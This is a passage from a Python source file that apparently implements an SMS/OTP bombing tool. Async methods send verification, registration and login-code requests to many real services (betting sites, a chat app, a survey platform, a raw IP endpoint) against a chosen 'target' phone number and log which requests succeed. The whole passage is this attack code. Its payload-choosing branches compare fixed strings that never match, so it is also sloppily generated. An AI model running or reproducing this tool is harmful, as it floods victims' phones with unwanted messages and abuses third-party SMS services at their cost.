            elif "Arogga" in "API100 - BASA18 SMS": payload = {"mobile": target}
            elif "MyGP" in "API100 - BASA18 SMS": pass
            elif "BDSTall" in "API100 - BASA18 SMS": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API100 - BASA18 SMS": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API100 - BASA18 SMS": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API100 - BASA18 SMS": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API100 - BASA18 SMS": payload = {"phoneNumber": target}
            elif "Sindabad" in "API100 - BASA18 SMS": payload = {"mobile": target}
            elif "Kirei" in "API100 - BASA18 SMS": payload = {"phone": target}
            elif "Shikho" in "API100 - BASA18 SMS": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API100 - BASA18 SMS": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API100 - BASA18 SMS", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API100 - BASA18 SMS", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API100 - BASA18 SMS", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api101_pkluck_register(self):
        target = self.target
        url = "https://www.pkluck2.com/wps/verification/sms/register"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API101 - PKLuck Register": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API101 - PKLuck Register": pass
            elif "Bioscope" in "API101 - PKLuck Register": payload = {"number": "+88" + target}
            elif "Proiojon" in "API101 - PKLuck Register": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API101 - PKLuck Register": payload = {"phone": target}
            elif "Medha" in "API101 - PKLuck Register": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API101 - PKLuck Register": payload = {"number": "+88" + target}
            elif "Robi" in "API101 - PKLuck Register": payload = {"phone_number": target}
            elif "Arogga" in "API101 - PKLuck Register": payload = {"mobile": target}
            elif "MyGP" in "API101 - PKLuck Register": pass
            elif "BDSTall" in "API101 - PKLuck Register": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API101 - PKLuck Register": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API101 - PKLuck Register": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API101 - PKLuck Register": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API101 - PKLuck Register": payload = {"phoneNumber": target}
            elif "Sindabad" in "API101 - PKLuck Register": payload = {"mobile": target}
            elif "Kirei" in "API101 - PKLuck Register": payload = {"phone": target}
            elif "Shikho" in "API101 - PKLuck Register": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API101 - PKLuck Register": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API101 - PKLuck Register", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API101 - PKLuck Register", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API101 - PKLuck Register", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api102_pkluck_nologin_otp(self):
        target = self.target
        url = "https://www.pkluck2.com/wps/verification/sms/noLogin"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API102 - PKLuck NoLogin OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API102 - PKLuck NoLogin OTP": pass
            elif "Bioscope" in "API102 - PKLuck NoLogin OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API102 - PKLuck NoLogin OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API102 - PKLuck NoLogin OTP": payload = {"phone": target}
            elif "Medha" in "API102 - PKLuck NoLogin OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API102 - PKLuck NoLogin OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API102 - PKLuck NoLogin OTP": payload = {"phone_number": target}
            elif "Arogga" in "API102 - PKLuck NoLogin OTP": payload = {"mobile": target}
            elif "MyGP" in "API102 - PKLuck NoLogin OTP": pass
            elif "BDSTall" in "API102 - PKLuck NoLogin OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API102 - PKLuck NoLogin OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API102 - PKLuck NoLogin OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API102 - PKLuck NoLogin OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API102 - PKLuck NoLogin OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API102 - PKLuck NoLogin OTP": payload = {"mobile": target}
            elif "Kirei" in "API102 - PKLuck NoLogin OTP": payload = {"phone": target}
            elif "Shikho" in "API102 - PKLuck NoLogin OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API102 - PKLuck NoLogin OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API102 - PKLuck NoLogin OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API102 - PKLuck NoLogin OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API102 - PKLuck NoLogin OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api103_8mbets_register(self):
        target = self.target
        url = "https://www.8mbets.net/api/register/verify"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API103 - 8MBets Register": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API103 - 8MBets Register": pass
            elif "Bioscope" in "API103 - 8MBets Register": payload = {"number": "+88" + target}
            elif "Proiojon" in "API103 - 8MBets Register": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API103 - 8MBets Register": payload = {"phone": target}
            elif "Medha" in "API103 - 8MBets Register": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API103 - 8MBets Register": payload = {"number": "+88" + target}
            elif "Robi" in "API103 - 8MBets Register": payload = {"phone_number": target}
            elif "Arogga" in "API103 - 8MBets Register": payload = {"mobile": target}
            elif "MyGP" in "API103 - 8MBets Register": pass
            elif "BDSTall" in "API103 - 8MBets Register": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API103 - 8MBets Register": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API103 - 8MBets Register": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API103 - 8MBets Register": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API103 - 8MBets Register": payload = {"phoneNumber": target}
            elif "Sindabad" in "API103 - 8MBets Register": payload = {"mobile": target}
            elif "Kirei" in "API103 - 8MBets Register": payload = {"phone": target}
            elif "Shikho" in "API103 - 8MBets Register": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API103 - 8MBets Register": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API103 - 8MBets Register", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API103 - 8MBets Register", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API103 - 8MBets Register", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api104_8mbets_new_mobile_request(self):
        target = self.target
        url = "https://www.8mbets.net/api/user/new-mobile-request"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API104 - 8MBets New Mobile Request": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API104 - 8MBets New Mobile Request": pass
            elif "Bioscope" in "API104 - 8MBets New Mobile Request": payload = {"number": "+88" + target}
            elif "Proiojon" in "API104 - 8MBets New Mobile Request": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API104 - 8MBets New Mobile Request": payload = {"phone": target}
            elif "Medha" in "API104 - 8MBets New Mobile Request": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API104 - 8MBets New Mobile Request": payload = {"number": "+88" + target}
            elif "Robi" in "API104 - 8MBets New Mobile Request": payload = {"phone_number": target}
            elif "Arogga" in "API104 - 8MBets New Mobile Request": payload = {"mobile": target}
            elif "MyGP" in "API104 - 8MBets New Mobile Request": pass
            elif "BDSTall" in "API104 - 8MBets New Mobile Request": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API104 - 8MBets New Mobile Request": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API104 - 8MBets New Mobile Request": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API104 - 8MBets New Mobile Request": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API104 - 8MBets New Mobile Request": payload = {"phoneNumber": target}
            elif "Sindabad" in "API104 - 8MBets New Mobile Request": payload = {"mobile": target}
            elif "Kirei" in "API104 - 8MBets New Mobile Request": payload = {"phone": target}
            elif "Shikho" in "API104 - 8MBets New Mobile Request": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API104 - 8MBets New Mobile Request": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API104 - 8MBets New Mobile Request", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API104 - 8MBets New Mobile Request", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API104 - 8MBets New Mobile Request", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api105_8mbets_forget_tac(self):
        target = self.target
        url = "https://www.8mbets.net/api/user/request-forget-tac"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API105 - 8MBets Forget TAC": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API105 - 8MBets Forget TAC": pass
            elif "Bioscope" in "API105 - 8MBets Forget TAC": payload = {"number": "+88" + target}
            elif "Proiojon" in "API105 - 8MBets Forget TAC": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API105 - 8MBets Forget TAC": payload = {"phone": target}
            elif "Medha" in "API105 - 8MBets Forget TAC": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API105 - 8MBets Forget TAC": payload = {"number": "+88" + target}
            elif "Robi" in "API105 - 8MBets Forget TAC": payload = {"phone_number": target}
            elif "Arogga" in "API105 - 8MBets Forget TAC": payload = {"mobile": target}
            elif "MyGP" in "API105 - 8MBets Forget TAC": pass
            elif "BDSTall" in "API105 - 8MBets Forget TAC": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API105 - 8MBets Forget TAC": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API105 - 8MBets Forget TAC": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API105 - 8MBets Forget TAC": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API105 - 8MBets Forget TAC": payload = {"phoneNumber": target}
            elif "Sindabad" in "API105 - 8MBets Forget TAC": payload = {"mobile": target}
            elif "Kirei" in "API105 - 8MBets Forget TAC": payload = {"phone": target}
            elif "Shikho" in "API105 - 8MBets Forget TAC": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API105 - 8MBets Forget TAC": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API105 - 8MBets Forget TAC", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API105 - 8MBets Forget TAC", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API105 - 8MBets Forget TAC", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api106_jayabaji_register(self):
        target = self.target
        url = "https://www.jayabaji3.com/api/register/confirm"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API106 - Jayabaji Register": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API106 - Jayabaji Register": pass
            elif "Bioscope" in "API106 - Jayabaji Register": payload = {"number": "+88" + target}
            elif "Proiojon" in "API106 - Jayabaji Register": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API106 - Jayabaji Register": payload = {"phone": target}
            elif "Medha" in "API106 - Jayabaji Register": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API106 - Jayabaji Register": payload = {"number": "+88" + target}
            elif "Robi" in "API106 - Jayabaji Register": payload = {"phone_number": target}
            elif "Arogga" in "API106 - Jayabaji Register": payload = {"mobile": target}
            elif "MyGP" in "API106 - Jayabaji Register": pass
            elif "BDSTall" in "API106 - Jayabaji Register": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API106 - Jayabaji Register": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API106 - Jayabaji Register": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API106 - Jayabaji Register": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API106 - Jayabaji Register": payload = {"phoneNumber": target}
            elif "Sindabad" in "API106 - Jayabaji Register": payload = {"mobile": target}
            elif "Kirei" in "API106 - Jayabaji Register": payload = {"phone": target}
            elif "Shikho" in "API106 - Jayabaji Register": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API106 - Jayabaji Register": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API106 - Jayabaji Register", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API106 - Jayabaji Register", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API106 - Jayabaji Register", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api107_jayabaji_new_mobile_request(self):
        target = self.target
        url = "https://www.jayabaji3.com/api/user/new-mobile-request"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API107 - Jayabaji New Mobile Request": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API107 - Jayabaji New Mobile Request": pass
            elif "Bioscope" in "API107 - Jayabaji New Mobile Request": payload = {"number": "+88" + target}
            elif "Proiojon" in "API107 - Jayabaji New Mobile Request": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API107 - Jayabaji New Mobile Request": payload = {"phone": target}
            elif "Medha" in "API107 - Jayabaji New Mobile Request": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API107 - Jayabaji New Mobile Request": payload = {"number": "+88" + target}
            elif "Robi" in "API107 - Jayabaji New Mobile Request": payload = {"phone_number": target}
            elif "Arogga" in "API107 - Jayabaji New Mobile Request": payload = {"mobile": target}
            elif "MyGP" in "API107 - Jayabaji New Mobile Request": pass
            elif "BDSTall" in "API107 - Jayabaji New Mobile Request": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API107 - Jayabaji New Mobile Request": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API107 - Jayabaji New Mobile Request": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API107 - Jayabaji New Mobile Request": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API107 - Jayabaji New Mobile Request": payload = {"phoneNumber": target}
            elif "Sindabad" in "API107 - Jayabaji New Mobile Request": payload = {"mobile": target}
            elif "Kirei" in "API107 - Jayabaji New Mobile Request": payload = {"phone": target}
            elif "Shikho" in "API107 - Jayabaji New Mobile Request": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API107 - Jayabaji New Mobile Request": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API107 - Jayabaji New Mobile Request", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API107 - Jayabaji New Mobile Request", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API107 - Jayabaji New Mobile Request", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api108_jayabaji_login_tac(self):
        target = self.target
        url = "https://www.jayabaji3.com/api/user/request-login-tac"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API108 - Jayabaji Login TAC": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API108 - Jayabaji Login TAC": pass
            elif "Bioscope" in "API108 - Jayabaji Login TAC": payload = {"number": "+88" + target}
            elif "Proiojon" in "API108 - Jayabaji Login TAC": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API108 - Jayabaji Login TAC": payload = {"phone": target}
            elif "Medha" in "API108 - Jayabaji Login TAC": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API108 - Jayabaji Login TAC": payload = {"number": "+88" + target}
            elif "Robi" in "API108 - Jayabaji Login TAC": payload = {"phone_number": target}
            elif "Arogga" in "API108 - Jayabaji Login TAC": payload = {"mobile": target}
            elif "MyGP" in "API108 - Jayabaji Login TAC": pass
            elif "BDSTall" in "API108 - Jayabaji Login TAC": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API108 - Jayabaji Login TAC": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API108 - Jayabaji Login TAC": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API108 - Jayabaji Login TAC": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API108 - Jayabaji Login TAC": payload = {"phoneNumber": target}
            elif "Sindabad" in "API108 - Jayabaji Login TAC": payload = {"mobile": target}
            elif "Kirei" in "API108 - Jayabaji Login TAC": payload = {"phone": target}
            elif "Shikho" in "API108 - Jayabaji Login TAC": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API108 - Jayabaji Login TAC": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API108 - Jayabaji Login TAC", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API108 - Jayabaji Login TAC", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API108 - Jayabaji Login TAC", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl001_103_4_145_86_8096(self):
        target = self.target
        url = "http://103.4.145.86:8096/api/app/v1/otp/send"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL001 103.4.145.86:8096": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL001 103.4.145.86:8096": pass
            elif "Bioscope" in "CURL001 103.4.145.86:8096": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL001 103.4.145.86:8096": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL001 103.4.145.86:8096": payload = {"phone": target}
            elif "Medha" in "CURL001 103.4.145.86:8096": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL001 103.4.145.86:8096": payload = {"number": "+88" + target}
            elif "Robi" in "CURL001 103.4.145.86:8096": payload = {"phone_number": target}
            elif "Arogga" in "CURL001 103.4.145.86:8096": payload = {"mobile": target}
            elif "MyGP" in "CURL001 103.4.145.86:8096": pass
            elif "BDSTall" in "CURL001 103.4.145.86:8096": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL001 103.4.145.86:8096": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL001 103.4.145.86:8096": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL001 103.4.145.86:8096": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL001 103.4.145.86:8096": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL001 103.4.145.86:8096": payload = {"mobile": target}
            elif "Kirei" in "CURL001 103.4.145.86:8096": payload = {"phone": target}
            elif "Shikho" in "CURL001 103.4.145.86:8096": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL001 103.4.145.86:8096": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL001 103.4.145.86:8096", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL001 103.4.145.86:8096", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL001 103.4.145.86:8096", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl002_cms_surveylancer_com(self):
        target = self.target
        url = "https://cms.surveylancer.com/api/app/v1/user/otp-send"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL002 cms.surveylancer.com": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL002 cms.surveylancer.com": pass
            elif "Bioscope" in "CURL002 cms.surveylancer.com": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL002 cms.surveylancer.com": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL002 cms.surveylancer.com": payload = {"phone": target}
            elif "Medha" in "CURL002 cms.surveylancer.com": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL002 cms.surveylancer.com": payload = {"number": "+88" + target}
            elif "Robi" in "CURL002 cms.surveylancer.com": payload = {"phone_number": target}
            elif "Arogga" in "CURL002 cms.surveylancer.com": payload = {"mobile": target}
            elif "MyGP" in "CURL002 cms.surveylancer.com": pass
            elif "BDSTall" in "CURL002 cms.surveylancer.com": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL002 cms.surveylancer.com": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL002 cms.surveylancer.com": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL002 cms.surveylancer.com": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL002 cms.surveylancer.com": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL002 cms.surveylancer.com": payload = {"mobile": target}
            elif "Kirei" in "CURL002 cms.surveylancer.com": payload = {"phone": target}
            elif "Shikho" in "CURL002 cms.surveylancer.com": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL002 cms.surveylancer.com": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL002 cms.surveylancer.com", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL002 cms.surveylancer.com", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL002 cms.surveylancer.com", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl003_api_sparkchat_net(self):
        target = self.target
        url = "https://api.sparkchat.net/api/v1/auth/signin"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "CURL003 api.sparkchat.net": payload = {"phoneNumber": target}
            elif "KhaasFood" in "CURL003 api.sparkchat.net": pass
            elif "Bioscope" in "CURL003 api.sparkchat.net": payload = {"number": "+88" + target}
            elif "Proiojon" in "CURL003 api.sparkchat.net": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "CURL003 api.sparkchat.net": payload = {"phone": target}
            elif "Medha" in "CURL003 api.sparkchat.net": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "CURL003 api.sparkchat.net": payload = {"number": "+88" + target}
            elif "Robi" in "CURL003 api.sparkchat.net": payload = {"phone_number": target}
            elif "Arogga" in "CURL003 api.sparkchat.net": payload = {"mobile": target}
            elif "MyGP" in "CURL003 api.sparkchat.net": pass
            elif "BDSTall" in "CURL003 api.sparkchat.net": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "CURL003 api.sparkchat.net": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "CURL003 api.sparkchat.net": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "CURL003 api.sparkchat.net": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "CURL003 api.sparkchat.net": payload = {"phoneNumber": target}
            elif "Sindabad" in "CURL003 api.sparkchat.net": payload = {"mobile": target}
            elif "Kirei" in "CURL003 api.sparkchat.net": payload = {"phone": target}
            elif "Shikho" in "CURL003 api.sparkchat.net": payload = {"phone": target, "type": "student"}
            elif "Circle" in "CURL003 api.sparkchat.net": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL003 api.sparkchat.net", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL003 api.sparkchat.net", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("CURL003 api.sparkchat.net", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_curl004_ali2bd_api_service_moveon_global(self):
        target = self.target
